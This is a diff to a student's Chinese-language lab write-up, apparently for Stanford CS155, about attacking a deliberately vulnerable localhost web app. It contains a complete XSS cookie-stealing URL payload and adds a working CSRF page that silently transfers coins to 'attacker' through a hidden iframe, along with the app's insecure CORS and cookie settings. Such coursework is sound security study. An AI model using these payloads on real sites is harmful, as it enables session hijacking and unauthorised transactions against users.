@@ -10,6 +10,7 @@
     + [Extra credit bypass stack canary](#extra-credit-bypass-stack-canary)
 - [Proj2](#proj2)
     + [Exploit Alpha Cookie Theft](#exploit-alpha-cookie-theft)
+    + [Exploit Bravo Cross Site Request Forgery](#exploit-bravo-cross-site-request-forgery)
 
 # Proj1
 ## Target1 Buffer overflow
@@ -1118,4 +1119,57 @@ window.location.replace("http://localhost:3000/profile?username=user1");
 完整的url请求如下所示
 ```html
 http://localhost:3000/profile?username=<p hidden><script>function getCookie(name) {var value = "; ".concat(document.cookie);var parts = value.split("; ".concat(name).concat("="));if (parts.length == 2) return parts.pop().split(";").shift();}var stolenCookie = getCookie("session");var xmlhttp = new XMLHttpRequest();xmlhttp.open('GET', 'http://localhost:3000/steal_cookie?cookie='.concat(stolenCookie)); xmlhttp.onload = function () {};xmlhttp.send();window.location.replace("http://localhost:3000/profile?username=user1");</script>
+```
+
+## Exploit Bravo Cross Site Request Forgery
+`app.js`文件中，修改了以下几处，使得CSRF有可乘之机
+
+- Access-Control-Allow-Origin用来控制跨域访问，默认关闭
+- httpOnly指只能通过http的方式来访问cookie，也就是说无法通过js来访问，比如`document.cookie`
+
+```javascript
+// adjust CORS policy (DO NOT CHANGE)
+app.use((req, res, next) => {
+  res.header("Access-Control-Allow-Origin", "null");
+  res.header("Access-Control-Allow-Credentials", "true");
+  next();
+});
+
+// set lax cookie policies (DO NOT CHANGE)
+app.use(cookieSession({
+  name: 'session',
+  maxAge: 24 * 60 * 60 * 1000, // 24 hours
+  signed: false,
+  sameSite: false,
+  httpOnly: false,
+}));
+```
+要注意的是，form的target指向一个空白iframe，因为正常情况下，form提交后会刷新页面，从而显示BitBar的内容，被别人发现233333，并且，只有当执行了`load`之后，才能执行`bye`中的跳转，因为在第一次load iframe的时候回执行，然后当form提交时候会再执行一次
+
+```html
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset='utf-8'>
+        <script>
+            var hit=false;
+            function load(){
+                document.getElementById('csrf').submit();
+                hit=true;
+            }
+            function bye(){
+                if(hit){
+                    window.location.replace("http://crypto.stanford.edu/cs155");
+                }
+            }
+        </script>
+    </head>
+    <body onload="load()">
+        <form id="csrf" method="POST" target="iframe" action="http://localhost:3000/post_transfer">
+            <input name="destination_username" type="hidden" value="attacker">
+            <input name="quantity" type="hidden" value="10">
+        </form>
+        <iframe style="width:0; height:0; border:0; border:none" name="iframe" onload="bye()"></iframe>
+    </body>
+</html>
 ```
